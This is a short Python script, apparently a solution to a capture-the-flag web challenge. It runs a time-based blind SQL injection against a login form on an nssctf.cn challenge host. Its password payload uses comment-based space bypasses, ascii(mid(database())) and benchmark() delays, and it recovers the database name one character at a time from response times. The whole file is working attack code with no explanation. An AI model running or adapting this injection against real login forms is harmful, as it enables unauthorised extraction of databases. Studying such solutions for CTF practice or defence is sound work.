import requests

burp0_url = "http://node6.anna.nssctf.cn:28106/index.php"
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                 "Accept-Language": "zh-CN,zh;q=0.9",
                 "Accept-Encoding": "gzip, deflate",
                 "Content-Type": "application/x-www-form-urlencoded",
                 }
all_print_str = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&'()*+,-./:;<=>?@[\]^_`{|}~"

query_str = ''
for length in range(1, 20):
    for char in all_print_str:
        payload = "mochu7'or/**/if(ascii(mid(database(),{0},1))/**/like/**/{1},benchmark(20000000,md5('mochu7')),1)#".format(length, ord(char))
        burp0_data = {"username": "admin", "password": payload}
        resp = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
        print('{} : {} : {}'.format(length, char, resp.elapsed.total_seconds()))
        if resp.elapsed.total_seconds() > 3:
            query_str += char
            print(query_str)
        else:
            continue
